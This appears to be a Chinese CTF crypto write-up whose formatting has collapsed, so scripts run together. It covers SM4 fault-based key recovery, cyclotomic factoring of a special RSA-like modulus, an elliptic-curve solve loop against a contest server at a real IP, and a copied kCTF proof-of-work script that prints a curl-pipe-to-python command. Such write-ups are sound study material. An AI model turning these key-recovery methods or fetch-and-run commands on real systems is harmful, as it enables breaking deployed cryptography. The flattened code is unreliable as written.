b:rotl32(b,30)^rotl32(b,24)^rotl32(b,22)^rotl32(b,18)^rotl32(b,16)^rotl32(b,14)^rotl32(b,12)^rotl32(b,8)^rotl32(b,4)^rotl32(b,2)^bfrom random import *ct = [&#x27;e5a304ea2ffc53a1ff94337c2b2ae5368b46c6da3cc37f8438eb967b29249d4e&#x27;, &#x27;6733baa353d4cfc4ff94337c58dc7fdbd6df83f4fbf6e5e838eb967b98d7e8d3&#x27;, &#x27;e77dbfe7868701fbd7072e6358dc7fdba067d296707bad1b0f4541dc98d7e8d3&#x27;, &#x27;54b772d532556d5573a6ab667c9ff76857b5efc3b62130668e46a79b163138e4&#x27;, &#x27;47339f6738dd9f4c9581fbd496dde76ea320d95b457e0373cddb910acc41fe35&#x27;] #for i in range(100):# a=getrandbits(32)# b=getrandbits(32)# assert(tfunc(a)^tfunc(b)==tfunc(a^b))ct0t=bytes.fromhex(ct[0][:32])ct0f=bytes.fromhex(ct[1][:32])#ct1t=bytes.fromhex(ct[0][32:])#ct1f=bytes.fromhex(ct[1][32:])buft=[0]*36buff=[0]*36for i in range(4): buft[-i-1]=l2i(ct0t[i*4:(i+1)*4]) buff[-i-1]=l2i(ct0f[i*4:(i+1)*4])buft[32:]=invpfunc(buft[32:],WDB)buff[32:]=invpfunc(buff[32:],WDB)#assert(invpfunc(buft[31:35],DB)[1:]==invpfunc(buff[31:35],WDB)[1:])dt=i2l(d(buff[35]^buft[35]))print(dt)dt=i2l(d(buff[35])^d(buft[35]))print(dt)rkl0=[set() for i in range(4)]print((dt))print(i2l(buff[32]^buft[32]))print(i2l(buff[33]^buft[33]))print(i2l(buff[34]^buft[34]))ict=i2l(buft[32]^buft[34]^buft[33])icf=i2l(buff[32]^buff[34]^buff[33])print(ict,icf)for i in range(4): for guess in range(256): if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]: rkl0[i].add(guess)print(rkl0) rkl0_1=copy(rkl0)print()#ct0t=bytes.fromhex(ct[0][:32])#ct0f=bytes.fromhex(ct[1][:32])ct0t=bytes.fromhex(ct[0][32:])ct0f=bytes.fromhex(ct[1][32:])buft=[0]*36buff=[0]*36for i in range(4): buft[-i-1]=l2i(ct0t[i*4:(i+1)*4]) buff[-i-1]=l2i(ct0f[i*4:(i+1)*4])buft[32:]=invpfunc(buft[32:],WDB)buff[32:]=invpfunc(buff[32:],WDB)assert(invpfunc(buft[31:],DB)[1:]==invpfunc(buff[31:],WDB)[1:])dt=i2l(d(buff[35]^buft[35]))rkl0=[set() for i in range(4)]print((dt))print(i2l(buff[32]^buft[32]))print(i2l(buff[33]^buft[33]))print(i2l(buff[34]^buft[34]))ict=i2l(buft[32]^buft[34]^buft[33])icf=i2l(buff[32]^buff[34]^buff[33])print(ict,icf)for i in range(4): for guess in range(256): if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]: rkl0[i].add(guess)print(rkl0) rk=[]for rki in range(4): print(rki) ctt=[bytes.fromhex(ct[rki][:32]),bytes.fromhex(ct[rki][32:])] ctf=[bytes.fromhex(ct[rki+1][:32]),bytes.fromhex(ct[rki+1][32:])] buft=[0]*36 buff=[0]*36 rkl=[[set(),set()] for i in range(4)] for times in range(2): ct0t=ctt[times] ct0f=ctf[times] for i in range(4): buft[-i-1]=l2i(ct0t[i*4:(i+1)*4]) buff[-i-1]=l2i(ct0f[i*4:(i+1)*4]) buft[32:]=invpfunc(buft[32:],WDB) buff[32:]=invpfunc(buff[32:],WDB) for i in range(rki): buff[31-i] = buff[35-i] ^ tfunc(buff[34-i]^buff[33-i]^buff[32-i]^rk[i]) buff[31-i:35-i]=invpfunc(buff[31-i:35-i],WDB) buft[31-i] = buft[35-i] ^ tfunc(buft[34-i]^buft[33-i]^buft[32-i]^rk[i]) buft[31-i:35-i]=invpfunc(buft[31-i:35-i],WDB) assert(invpfunc(buft[31-rki:],DB)[1:]==invpfunc(buff[31-rki:],WDB)[1:]) ict=i2l(buft[32-rki]^buft[34-rki]^buft[33-rki]) icf=i2l(buff[32-rki]^buff[34-rki]^buff[33-rki]) dt=i2l(d(buff[35-rki]^buft[35-rki])) for i in range(4): for guess in range(256): if SM4_BOXES_TABLE[ict[i]^guess]^SM4_BOXES_TABLE[icf[i]^guess]==dt[i]: rkl[i][times].add(guess) print(rkl) rkn=[(rkl[i][0]&amp;rkl[i][1]) for i in range(4)] print(rkn) assert(all([len(i)==1 for i in rkn])) rkn=[list(i)[0] for i in rkn] rk.append(l2i(rkn)) print(rk[::-1])def inv_expand_key(rk): k = [0]*36 k[-4:] = rk for i in range(32): k[-i - 5] = k[-i-1] ^ (round_key(k[-i - 2] ^ k[-i - 3] ^ k[-i -4] ^ SM4_CK[-i-1])) MK=xor(k[0:4],SM4_FK) return MK,k[4:]from Crypto.Util.number import *MK,rks=inv_expand_key(rk[::-1])print(MK,rks) def inv_one_round(bk, rk, dt): out = [] buf = [0]*36 buf[:4] = [l2i(bk[:4]), l2i(bk[4:8]), l2i(bk[8:12]), l2i(bk[12:])] buf=buf[::-1] dance() for i in range(31,-1,-1): buf[i+1:i+5] = invpfunc(buf[i+1:i+5],Dance_Box) buf[i] = buf[i+4] ^ tfunc(buf[i+1]^buf[i+2]^buf[i+3]^rk[i]) if dt == i: dance() for _ in range(4): out += i2l(buf[_]) return outprint(bytes(inv_one_round(bytes.fromhex(ct[0][:32]),rks,31))+bytes(inv_one_round(bytes.fromhex(ct[0][32:]),rks,31)))exit()for i in range(10): key=long_to_bytes(getrandbits(128)) rk=expand_key(key) ans=one_round(key,rk,31) key1=inv_one_round(ans,rk,31) print(key,key1) e20k注意到n&#x3D;pqr&#x3D;pq(2q-1) -&gt;2n&#x3D;p2q(2q-1)&#x3D;pr(r+1)，一眼分圆多项式，找个脚本，分解n 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194#!/usr/bin/env sagefrom Crypto.Util.number import *P.&lt;x, y&gt; = PolynomialRing(ZZ)R.&lt;z&gt; = PolynomialRing(ZZ)z = R.gens()[0]def calculate_eta_all(eta, aa, bb, m, k): eta_all = [] for i in range(k): temp = eta^(aa^i) add = temp for _ in range((m-1)//k - 1): add = add^bb temp += add eta_all.append(temp) return eta_alldef calculate_irreducible_polynomial(eta_all, m): h = 1 for i in range(k): h *= (y - eta_all[i].lift()) d = sum([x^i for i in range(m)]) f_irreducible = h % d return f_irreducible, ddef pad_polynomial_coefficients(f, m): tmp = f.list() while len(tmp) &lt; m: tmp.append(0) return tmp def Factoring_with_Cyclotomic_Polynomials(k, n): Phi = cyclotomic_polynomial(k) Psi = (z^k-1)//(cyclotomic_polynomial(k)) print(&#x27;Cyclotomic_Polynomials Phi:&#x27;, Phi) print(&#x27;Psi:&#x27;, Psi) m = 1 while True: useful = False while not useful: m += k if not isPrime(m): continue aa = primitive_root(m) ff = x^m - 1 Q = P.quo(ff) eta = Q.gens()[0] for bb in range(2, m): if (bb^((m-1)//k)-1)//(bb-1) % m: continue eta_all = calculate_eta_all(eta, aa, bb, m, k) f_irreducible, d = calculate_irreducible_polynomial(eta_all, m) if f_irreducible.subs(y=0) in ZZ: useful = True break eta0 = eta_all[0] eta0_pow = [] for i in range(2, k): eta0_pow_i = (eta0^i).lift().subs(x=z) constant_term = eta0_pow_i.list()[0] if constant_term != 0: dd = (d-1).subs(x=z) eta0_pow_i = eta0_pow_i - constant_term - constant_term * dd eta0_pow.append(eta0_pow_i) coeff = [] for i in range(k): coeff.append(pad_polynomial_coefficients(eta_all[i].lift().subs(x=z), m)) A = matrix(QQ, coeff) terget = [[-1]*k, [1] + [0]*(k-1)] for i in range(k-2): terget.append(A.solve_left(vector(pad_polynomial_coefficients(eta0_pow[i], m)))) B = matrix(QQ, terget) U.&lt;w&gt; = PolynomialRing(QQ) w = U.gens()[0] eta1 = U(list((B^-1)[1])) f = f_irreducible.subs(y=w) V = U.quo(f) eta1 = V(eta1) C = matrix(QQ, k, k) C[0, 0] = 1 for i in range(1, k): tmp = eta1^i C[i] = pad_polynomial_coefficients(tmp, k) K.&lt;s&gt; = PolynomialRing(Zmod(n)) f_modulo = f_irreducible.subs(y=s) K_quo = K.quo(f_modulo) f_ZZ = f_irreducible.subs(y=z) try: sigma = matrix(Zmod(n), C) except: continue while True: g = R.random_element(k-1) try: kk, _, h = xgcd(f_ZZ, g) h = inverse_mod(int(kk), n) * h break except: continue g = g.subs(y=x) g_Q = K_quo(g) h_Q = K_quo(h) assert g_Q * h_Q == 1 Psi_coefficients = Psi.coefficients() Psi_monomials = Psi.monomials()[::-1] if Psi_coefficients[0] &lt; 0: yy = h_Q^(-Psi_coefficients[0]) else: yy = g_Q^(Psi_coefficients[0]) for i in range(1, len(Psi_monomials)): if Psi_coefficients[i] &lt; 0: yy *= K_quo(list(vector(list(h_Q^(-Psi_coefficients[i]))) * Psi_monomials[i](sigma))) else: yy *= K_quo(list(vector(list(g_Q^(Psi_coefficients[i]))) * Psi_monomials[i](sigma))) yy = yy^n if gcd(yy[1], n) &gt; 2**20: return gcd(yy[1], n)if __name__ == &quot;__main__&quot;: k = 2 # the k-th cyclotomic_polynomial Phi = cyclotomic_polynomial(k) N = int(input()) pp = Factoring_with_Cyclotomic_Polynomials(k, N) assert not N % int(pp) r=int(pp) q=(r+1)//2 p=N//(q*r) assert is_prime(r) assert is_prime(q) assert is_prime(p) assert N%p==0 assert is_prime(q) assert is_prime(r) E=EllipticCurve(Zmod(N), [3, 7]) y2=lambda x :x^3+3*x+7 fs=[p,q,r] E1=EllipticCurve(Zmod(p), [3, 7]) E2=EllipticCurve(Zmod(q), [3, 7]) E3=EllipticCurve(Zmod(r), [3, 7]) n1=E1.order() n2=E2.order() n3=E3.order() ns=[n1,n2,n3] try: assert(all([ni%3==0 for ni in ns])) except: print(&quot;wrong&quot;) exit() O1=E1.random_point()*n1 P1=E1.random_point() h1=n1//3 while h1*P1==O1: P1=E1.random_point() O2=E2.random_point()*n2 P2=E2.random_point() h2=n2//3 while h2*P2==O2: P2=E2.random_point() O3=E3.random_point()*n3 P3=E3.random_point() h3=n3//3 while h3*P3==O3: P3=E3.random_point() Qs=[h1*P1,h2*P2,h3*P3] xs=[int(Qi.xy()[0]) for Qi in Qs] x=crt(xs,fs) ys=[int(Qi.xy()[1]) for Qi in Qs] y=crt(ys,fs) print(x,&quot;,&quot;,y) print(E(x,y)) print(E(x,y)*4) 发现迭代有个A:&#x3D;4*A的结构，来都来了，分解构造一下A为阶是3的点，不过需要多爆破pow（校园网被制裁了，获取了一份本地pow脚本来用） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187#!/usr/bin/env python3# -*- coding: utf-8 -*-# Copyright 2020 Google LLC## Licensed under the Apache License, Version 2.0 (the &quot;License&quot;);# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## https://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an &quot;AS IS&quot; BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.import base64import osimport secretsimport socketimport sysimport hashlibtry: import gmpy2 HAVE_GMP = Trueexcept ImportError: HAVE_GMP = False sys.stderr.write(&quot;[NOTICE] Running 10x slower, gotta go fast? pip3 install gmpy2\\n&quot;)VERSION = &#x27;s&#x27;MODULUS = 2**1279-1CHALSIZE = 2**128SOLVER_URL = &#x27;https://goo.gle/kctf-pow&#x27;def python_sloth_root(x, diff, p): exponent = (p + 1) // 4 for i in range(diff): x = pow(x, exponent, p) ^ 1 return xdef python_sloth_square(y, diff, p): for i in range(diff): y = pow(y ^ 1, 2, p) return ydef gmpy_sloth_root(x, diff, p): exponent = (p + 1) // 4 for i in range(diff): x = gmpy2.powmod(x, exponent, p).bit_flip(0) return int(x)def gmpy_sloth_square(y, diff, p): y = gmpy2.mpz(y) for i in range(diff): y = gmpy2.powmod(y.bit_flip(0), 2, p) return int(y)def sloth_root(x, diff, p): if HAVE_GMP: return gmpy_sloth_root(x, diff, p) else: return python_sloth_root(x, diff, p)def sloth_square(x, diff, p): if HAVE_GMP: return gmpy_sloth_square(x, diff, p) else: return python_sloth_square(x, diff, p)def encode_number(num): size = (num.bit_length() // 24) * 3 + 3 return str(base64.b64encode(num.to_bytes(size, &#x27;big&#x27;)), &#x27;utf-8&#x27;)def decode_number(enc): return int.from_bytes(base64.b64decode(bytes(enc, &#x27;utf-8&#x27;)), &#x27;big&#x27;)def decode_challenge(enc): dec = enc.split(&#x27;.&#x27;) if dec[0] != VERSION: raise Exception(&#x27;Unknown challenge version&#x27;) return list(map(decode_number, dec[1:]))def encode_challenge(arr): return &#x27;.&#x27;.join([VERSION] + list(map(encode_number, arr)))def get_challenge(diff): x = secrets.randbelow(CHALSIZE) return encode_challenge([diff, x])def solve_challenge(chal): [diff, x] = decode_challenge(chal) y = sloth_root(x, diff, MODULUS) return encode_challenge([y])def can_bypass(chal, sol): from ecdsa import VerifyingKey from ecdsa.util import sigdecode_der if not sol.startswith(&#x27;b.&#x27;): return False sig = bytes.fromhex(sol[2:]) with open(&quot;/kctf/pow-bypass/pow-bypass-key-pub.pem&quot;, &quot;r&quot;) as fd: vk = VerifyingKey.from_pem(fd.read()) return vk.verify(signature=sig, data=bytes(chal, &#x27;ascii&#x27;), hashfunc=hashlib.sha256, sigdecode=sigdecode_der)def verify_challenge(chal, sol, allow_bypass=True): if allow_bypass and can_bypass(chal, sol): return True [diff, x] = decode_challenge(chal) [y] = decode_challenge(sol) res = sloth_square(y, diff, MODULUS) return (x == res) or (MODULUS - x == res)def usage(): sys.stdout.write(&#x27;Usage:\\n&#x27;) sys.stdout.write(&#x27;Solve pow: &#123;&#125; solve $challenge\\n&#x27;) sys.stdout.write(&#x27;Check pow: &#123;&#125; ask $difficulty\\n&#x27;) sys.stdout.write(&#x27; $difficulty examples (for 1.6GHz CPU) in fast mode:\\n&#x27;) sys.stdout.write(&#x27; 1337: 1 sec\\n&#x27;) sys.stdout.write(&#x27; 31337: 30 secs\\n&#x27;) sys.stdout.write(&#x27; 313373: 5 mins\\n&#x27;) sys.stdout.flush() sys.exit(1)def main(): if len(sys.argv) != 3: usage() sys.exit(1) cmd = sys.argv[1] if cmd == &#x27;ask&#x27;: difficulty = int(sys.argv[2]) if difficulty == 0: sys.stdout.write(&quot;== proof-of-work: disabled ==\\n&quot;) sys.exit(0) challenge = get_challenge(difficulty) sys.stdout.write(&quot;== proof-of-work: enabled ==\\n&quot;) sys.stdout.write(&quot;please solve a pow first\\n&quot;) sys.stdout.write(&quot;You can run the solver with:\\n&quot;) sys.stdout.write(&quot; python3 &lt;(curl -sSL &#123;&#125;) solve &#123;&#125;\\n&quot;.format(SOLVER_URL, challenge)) sys.stdout.write(&quot;===================\\n&quot;) sys.stdout.write(&quot;\\n&quot;) sys.stdout.write(&quot;Solution? &quot;) sys.stdout.flush() solution = &#x27;&#x27; with os.fdopen(0, &quot;rb&quot;, 0) as f: while not solution: line = f.readline().decode(&quot;utf-8&quot;) if not line: sys.stdout.write(&quot;EOF&quot;) sys.stdout.flush() sys.exit(1) solution = line.strip() if verify_challenge(challenge, solution): sys.stdout.write(&quot;Correct\\n&quot;) sys.stdout.flush() sys.exit(0) else: sys.stdout.write(&quot;Proof-of-work fail&quot;) sys.stdout.flush() elif cmd == &#x27;solve&#x27;: challenge = sys.argv[2] solution = solve_challenge(challenge) if verify_challenge(challenge, solution, False): sys.stderr.write(&quot;Solution: \\n&quot;.format(solution)) sys.stderr.flush() sys.stdout.write(solution) sys.stdout.flush() sys.stderr.write(&quot;\\n&quot;) sys.stderr.flush() sys.exit(0) else: usage() sys.exit(1)if __name__ == &quot;__main__&quot;: main() 跑主程序爆破参数 12345678910111213141516171819202122232425262728293031from pwn import *from os import *while 1: p=remote(&quot;121.41.9.20&quot;,&quot;6665&quot;) p.recvuntil(b&quot;kctf-pow)&quot;) s=p.recvline() q=popen(&quot; python3 n1pow.py &quot;+s.decode()).read() p.sendline(q) p.recvuntil(b&quot;N =&quot;) s=p.recvline() N=int(s) q=process(&quot;c.sage&quot;) q.sendline(str(N).encode()) print(q.recvline()) print(q.recvline()) s=(q.recvline()) print(s) if b&quot;wrong&quot; in s: q.close() p.close() continue p.sendline(s) print(q.recvline()) print(q.recvline()) p.recvuntil(b&quot;&gt;&quot;) f=open(&quot;ans&quot;,&quot;w&quot;) for i in range(5): s=p.recvline().decode() f.write(s) f.close() 得到的数据如下 1234567891011121314151617181920212223242526[+] Starting local process &#x27;./c.sage&#x27;: pid 41666b&#x27;Cyclotomic_Polynomials Phi: x + 1\\n&#x27;b&#x27;Psi: z - 1\\n&#x27;b&#x27;wrong\\n&#x27;[*] Stopped process &#x27;./c.sage&#x27; (pid 41666)[*] Closed connection to 121.41.9.20 port 6665[+] Opening connection to 121.41.9.20 on port 6665: DoneSolution: [+] Starting local process &#x27;./c.sage&#x27;: pid 41925b&#x27;Cyclotomic_Polynomials Phi: x + 1\\n&#x27;b&#x27;Psi: z - 1\\n&#x27;b&#x27;1094477304520127985790672621025600999610374173335205039140666609042008538358640473234617871224544718583218818352868128358491538147523272150726235978173256045229998201241704950147287615608045349561023357107016512696700676043527970164 , 1030763785771014717987046304138394442836489889852139479828737981379477233707655574344364525812555575119657470138367621943896352669484624126417247531463800890500345489912586031653601473632884174617800095966332075198093606668070092424\\n&#x27;b&#x27;(1094477304520127985790672621025600999610374173335205039140666609042008538358640473234617871224544718583218818352868128358491538147523272150726235978173256045229998201241704950147287615608045349561023357107016512696700676043527970164 : 1030763785771014717987046304138394442836489889852139479828737981379477233707655574344364525812555575119657470138367621943896352669484624126417247531463800890500345489912586031653601473632884174617800095966332075198093606668070092424 : 1)\\n&#x27;b&#x27;(1094477304520127985790672621025600999610374173335205039140666609042008538358640473234617871224544718583218818352868128358491538147523272150726235978173256045229998201241704950147287615608045349561023357107016512696700676043527970164 : 1030763785771014717987046304138394442836489889852139479828737981379477233707655574344364525812555575119657470138367621943896352669484624126417247531463800890500345489912586031653601473632884174617800095966332075198093606668070092424 : 1)\\n&#x27; A = [[2491297, 3923144, 1289455, 4021716, 337975, 3143770, 3557950, 341304, 455942, 4177670, 3340546, 4028765, 2320870, 3081978, 818985, 3242259, 995549, 2729547, 219631, 2130206, 2431889, 3437133, 705892, 3268589, 3687934, 958931, 2516192, 1860165, 1023453, 2954972, 2407318, 3854332, 2320389, 1597429, 171260, 2195369, 1977065, 2954121, 103688, 2179696, 3341984, 941977, 3206534, 1013687, 2216577, 2195795, 237843, 2334271, 2206600, 608485, 3503558, 2473745, 3883407, 3529280, 218265, 3883654, 324031, 186429, 4126800, 3153156, 2220126, 4061700, 3316219, 3172105, 1847039, 3294403, 4147423, 256592, 3436950, 3100090, 1520285, 2064569, 2565047, 1028084, 1620973, 1948607, 3549132, 2359710, 1992828, 3487450, 3612080, 441053, 2199156, 2890422, 2562147, 369063, 4107126, 1146899, 2775186, 3074284, 2753658, 4182387, 3832577, 775926, 4107285, 27264, 2878053, 515185, 258373, 1455220, 2856349, 2462819, 865942, 326474, 3358641, 948506, 2445678, 1017908, 3547779, 658361, 2829207, 1683034, 3768709, 233977, 2944173, 2089850, 2168140, 804839, 780839, 635210, 1308962, 1163123, 1713794, 98445, 2589738, 3272446, 2326080, 505141, 3906582, 4077935, 1000292, 3121629, 2704903, 3250847, 2300956, 2865041, 282192, 2033060, 657556, 1942823, 3110353, 3376364, 718090, 1806372, 499584, 3522863, 1521762, 2786971, 2140682, 216926, 753243, 2974405, 3427513, 1482251, 2946392, 620784, 2812018, 3708482, 3628507, 1350323, 2669060, 871044, 4080642, 48697, 831735, 2081975, 1003680, 2779456, 2768433, 1319487, 2764139, 2743293, 500875, 2756771, 688928, 2420450, 2542999, 3781383, 4020987, 4000070, 1373818, 923562, 877075, 2970373, 3037725, 3289830, 2511141, 4063531, 1637947, 23000, 4187246, 1996064, 1458136, 3977302, 3491665, 1028387, 4028398, 397765, 1760132, 3153398, 3810161, 1971495, 756643, 181167, 3346185, 2046059, 1731694, 1482343, 1273960, 3769920, 175011, 1974455, 2847092, 3199068, 1133365, 1840605, 1382941, 336790, 246835, 3524062, 2275571, 260893, 2522464, 3760909, 2401319, 1972892, 2192355, 2348559, 2968746, 1303894, 4037725, 1070976, 1650576, 3755849, 1724561, 1374666, 653155, 19966, 2152355, 3737399, 3755720, 1139557, 2850582, 3856019, 605733, 800279, 3507621, 311368, 1360210, 3610070, 1018469, 734703, 4111035, 3317616, 2509163, 1027214], [2345579, 3645598, 3313317, 868986, 2201238, 1012434, 4189116, 1833309, 4173250, 1539013, 2558865, 2459736, 3040085, 2641552, 2193150, 3142570, 2096227, 3497720, 3677427, 2826051, 2201963, 2032938, 1751020, 2338084, 501735, 1528173, 1190332, 4039135, 1073609, 2545180, 1483656, 2261722, 1502393, 1950848, 3415037, 2883983, 2952067, 2642902, 150578, 710864, 988399, 633646, 3124896, 1048336, 3864721, 328673, 1853513, 364917, 3308868, 1171552, 3653516, 1468422, 3032090, 2842047, 254437, 2104220, 2876379, 3130725, 1805478, 1526141, 1050520, 2759137, 634328, 4144451, 1239675, 557252, 3977009, 1058165, 4061107, 1956486, 3965945, 3733416, 1361329, 84827, 2915466, 4006254, 3823624, 2452237, 2204002, 1089647, 1309236, 2259059, 2315689, 161139, 3420761, 3165117, 32634, 310702, 1795941, 3035148, 1184669, 2379592, 1857466, 134155, 2562046, 254428, 1773396, 1212942, 2335734, 2443291, 538951, 1855586, 1032635, 3763662, 4017205, 2329915, 2709951, 723648, 168887, 838418, 938926, 1732765, 3484614, 3417960, 83567, 363241, 327574, 433880, 1098638, 179849, 2172410, 3152540, 1782369, 3655145, 2103838, 2060915, 1347678, 2374927, 3158348, 1250185, 3539603, 2618718, 815436, 2951094, 3879951, 1406088, 3907098, 3816768, 1957820, 2878717, 3972083, 1619762, 4147989, 3924744, 142801, 2985546, 2900015, 379251, 924103, 560227, 893488, 2927729, 3043682, 2100176, 3095382, 1948851, 818115, 1370625, 384082, 4177415, 3928916, 2162582, 3336817, 2073043, 3104122, 3531532, 3725890, 671778, 1545701, 1455832, 2491527, 2886274, 2566667, 2913638, 2814684, 1363911, 1069791, 3122004, 4138263, 1118042, 2967808, 1943444, 1439078, 1427258, 649506, 1747073, 3315692, 2404840, 3344307, 3058404, 1012657, 337436, 282239, 3987438, 3563971, 3232709, 1405828, 461145, 1246785, 1132791, 3004771, 660781, 172717, 3190937, 3876997, 2164256, 2070087, 3909187, 2876423, 2804502, 2649946, 28203, 3395597, 3364832, 4106070, 263331, 2648126, 1600290, 721167, 3991279, 2932850, 1816848, 1237930, 3805917, 683434, 56233, 2234822, 2720667, 301679, 4113339, 2938618, 2568280, 2085721, 1870990, 3946203, 1495215, 3487766, 916775, 1022709, 3495902, 1916009, 283993, 2414527, 2646368, 601247, 2633472, 1141376, 3114228, 978394, 2534075, 2624492, 590455, 828034, 1437948, 3805189, 2834344], [1704558, 816765, 3762174, 1494750, 1314054, 3081791, 4124342, 541062, 449851, 2310408, 2187891, 258791, 1466525, 1033243, 1953211, 2821936, 1326046, 2201689, 1504898, 1188458, 1968064, 729708, 3860108, 1748121, 445286, 2990623, 623241, 1555763, 837271, 1024731, 3186362, 3385837, 4040413, 717731, 2217974, 1436441, 4089141, 2329301, 115121, 3151348, 3927806, 2871048, 2096694, 2148109, 2215987, 742646, 2595695, 201314, 1196252, 4092574, 3413334, 1566110, 1452711, 2764185, 1843047, 2722853, 2821082, 3936775, 94394, 154605, 3496812, 3102180, 3668794, 1323547, 621691, 2689849, 3942136, 703083, 3951980, 2518921, 165811, 4039110, 3293950, 4005581, 3989260, 302252, 1500390, 3996893, 184110, 3568920, 2832436, 1967628, 1872907, 1142142, 2241968, 1837314, 4000338, 2183446, 3666725, 2555221, 3098309, 348421, 224049, 4131037, 513747, 4025743, 408370, 1133043, 107358, 917065, 3112215, 4085435, 2350218, 1200235, 2353263, 397736, 570928, 2745875, 1625517, 986524, 405084, 2704966, 1161971, 976713, 4007883, 1231129, 1768281, 1649306, 3886654, 2863786, 955169, 1241834, 3270723, 2366932, 1518102, 1551350, 305123, 3610014, 1417357, 119498, 2573323, 3770262, 3274151, 1204945, 533524, 698269, 4047049, 144159, 1733552, 1937443, 3526562, 2728688, 3366942, 3501818, 865077, 2972243, 349401, 692591, 3372260, 3817253, 3814556, 2961825, 2008053, 2231645, 1347363, 2366615, 3538574, 2064725, 3217945, 335197, 1625433, 3294612, 3313807, 3103512, 3913029, 1140, 3656003, 1300868, 960707, 2691728, 3461722, 2076883, 2762090, 1763491, 2659853, 2649390, 2543718, 2776401, 2115083, 991771, 2399598, 2898148, 983994, 2121942, 3267972, 3419492, 1325456, 2132297, 82758, 1037371, 2216854, 946909, 717051, 2690649, 1527256, 3216202, 212119, 213143, 1947188, 2019239, 1556156, 366669, 4086440, 3805270, 3629077, 1479207, 228876, 773062, 18116, 3825880, 2570871, 1032612, 3786367, 3167506, 1382747, 708805, 359386, 1092968, 265381, 832395, 1839924, 3186779, 1446616, 130730, 1839728, 718508, 378034, 554270, 2275993, 148025, 1677152, 1800446, 4127956, 2214902, 2077929, 4006828, 3345834, 1275040, 3872820, 3017394, 603581, 2917266, 791981, 1887610, 688591, 985010, 3732271, 1900118, 1358876, 1549589, 1813013, 1808563, 706400, 3935940, 1193314, 115921], [1274013, 3735294, 2972120, 4059752, 2836627, 2019431, 2586880, 3732312, 1357547, 3539208, 1549518, 2319645, 1735832, 713543, 2402513, 1082102, 582150, 2355894, 2891749, 1574407, 2360796, 194818, 4092509, 2828740, 4151941, 2777779, 4153191, 3084546, 665776, 478680, 1000398, 1674356, 3203569, 2365990, 358123, 2354367, 106370, 2270033, 732787, 169742, 1828784, 1481625, 813489, 2477957, 1229792, 2729352, 2866275, 2057713, 1227326, 2195519, 2888473, 3219172, 1877123, 3177232, 2924673, 3895833, 3210735, 4097704, 2741833, 3512236, 4117152, 2909683, 2331528, 2772270, 2564983, 3243833, 502914, 1276486, 31250, 3162804, 858144, 3993727, 4093294, 1988824, 3126098, 3472528, 1543910, 639283, 4106751, 2408836, 920223, 1619178, 4082729, 2392804, 2988073, 1701021, 637168, 3479362, 3539216, 3208843, 3160628, 3304419, 1513232, 1187076, 890760, 2723933, 1013302, 1706643, 1990119, 914849, 3051620, 2266231, 3167828, 1985379, 1294763, 1013235, 691641, 614804, 908753, 1793142, 4186308, 223077, 296466, 3094122, 375142, 3982343, 1837355, 3269322, 859890, 3351653, 2024995, 2850579, 3239764, 2696780, 1932390, 2300504, 2203648, 1115926, 2597636, 4162550, 1997742, 1350661, 3278081, 3708696, 692800, 1437388, 391611, 2181932, 2764640, 906844, 1777085, 400108, 2365510, 1381554, 2355958, 3181617, 3455732, 1173164, 2887967, 921139, 1781374, 1511714, 699951, 3425562, 2867911, 169570, 874748, 2434342, 1699422, 2981625, 2014154, 3049470, 829940, 1235688, 3777739, 1674803, 1168362, 4015868, 178143, 239988, 2689798, 2611450, 2838743, 1920275, 2807774, 2095417, 2054441, 285765, 161435, 3628559, 3292071, 257092, 418023, 3970008, 2149606, 1815174, 2943903, 2190266, 4083374, 2533108, 1804450, 2280451, 488329, 2655258, 303725, 794834, 2985520, 3353763, 313460, 641409, 350069, 1249795, 2518737, 1196538, 1062469, 4117679, 2137371, 3037576, 1525799, 1628834, 1851259, 3605877, 17674, 2146625, 3135852, 3846789, 3764278, 2443989, 2575252, 1214527, 2093221, 2528388, 1900521, 1286708, 1117773, 2478942, 3428491, 451114, 1164863, 4006248, 1653957, 1169296, 2151813, 2568214, 1207407, 3482199, 1193504, 1249941, 306877, 1966726, 470848, 2629118, 4092565, 1131887, 1249531, 1477343, 2552369, 1035404, 2284282, 2156209, 1083999, 1582261, 117275, 3449321, 3547909, 565898], [755247, 2004218, 3831019, 3310505, 377980, 3096277, 3570211, 1274098, 4066058, 2427810, 457273, 2880650, 2989099, 859363, 2778606, 1773657, 210751, 40001, 1458653, 157252, 195056, 2093708, 3369555, 2605385, 3320275, 3749099, 1477421, 1054171, 2772148, 638835, 87582, 2850418, 2763904, 3982904, 1953185, 2194746, 849749, 3065644, 1750476, 3588117, 1676718, 2935960, 849569, 831605, 2773794, 851833, 2623136, 3310115, 3180557, 3742379, 3287878, 336838, 2995874, 2832109, 544451, 2776875, 1371686, 3989874, 3469048, 2489362, 3007872, 1659039, 3661677, 597109, 453864, 1023305, 3585161, 98373, 536981, 76725, 1226337, 645920, 613436, 3357251, 3813251, 2694057, 2096916, 2427108, 1717671, 2321549, 2678039, 1615981, 3748204, 264229, 597758, 447948, 2909540, 53418, 2876859, 533811, 1500833, 2820669, 2449890, 4176775, 3587356, 4062670, 1943167, 477111, 534903, 3023573, 1167975, 582820, 482747, 2294862, 67516, 588818, 2819354, 2491476, 383064, 1318652, 1045070, 3855672, 2139215, 1898570, 2951153, 1572337, 702667, 212333, 574580, 460794, 1855606, 2852606, 1395044, 509667, 1236263, 4034804, 2068966, 2638790, 459146, 1654870, 1211495, 581021, 2488585, 3797276, 2352559, 2169006, 3140976, 2507736, 3151948, 1444374, 385704, 1335317, 3646075, 3695509, 3108143, 898043, 2100525, 2909814, 1571195, 2834524, 2811040, 2776459, 